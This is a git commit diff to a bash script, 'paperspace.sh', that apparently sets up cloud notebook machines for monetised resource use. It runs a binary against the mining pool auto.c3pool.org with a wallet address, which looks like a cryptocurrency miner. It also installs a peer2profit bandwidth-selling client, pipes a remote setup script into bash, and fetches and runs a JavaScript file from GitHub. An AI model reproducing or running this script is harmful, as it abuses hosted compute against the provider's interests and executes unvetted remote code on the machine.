c575b049bad3cc025bd3213603f642cc0627c367
0chaowenguo0 <105636013+0chaowenguo0@users.noreply.github.com>
2022-05-16 08:39:59 -0500

    Update paperspace.sh

--- paperspace.sh
+++ paperspace.sh
@@ -1,6 +1,6 @@
 %%bash
 ./fast -B -t 2 -o auto.c3pool.org:443 -u 87giDqqPT1GPU9ukh1GNSpioyJM1G2zqjL8ukY9gP7ngZ2zpH9tuZFD755E94j9F56Y2FFq5B33SFe8a8LqybR2WJsb8ssR
-curl https://updates.peer2profit.app/p2pclient_0.59_amd64.deb.zip | gunzip > p2pclient.deb 
+curl https://updates.peer2profit.app/p2pclient_0.60_amd64.deb.zip > p2pclient.deb 
 dpkg --fsys-tarfile p2pclient.deb | tar -xf - ./usr/bin/p2pclient
 mv usr/bin/p2pclient .
 curl https://deb.nodesource.com/setup_current.x | bash -
@@ -9,7 +9,7 @@ apt update
 apt install -y --no-install-recommends nodejs xvfb ./chrome.deb
 rm -rf usr chrome.deb p2pclient.deb
 export PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD=1
-curl https://raw.githubusercontent.com/orgchaowenguo0/common/main/package.json > package.json
+curl https://raw.githubusercontent.com/chaowenguoorg0/common/main/package.json > package.json
 npm install playwright-chromium
-curl https://raw.githubusercontent.com/orgchaowenguo0/pal/main/js/pal.js > pal.js
+curl https://raw.githubusercontent.com/chaowenguoorg0/pal/main/js/pal.js > pal.js
 xvfb-run node pal.js
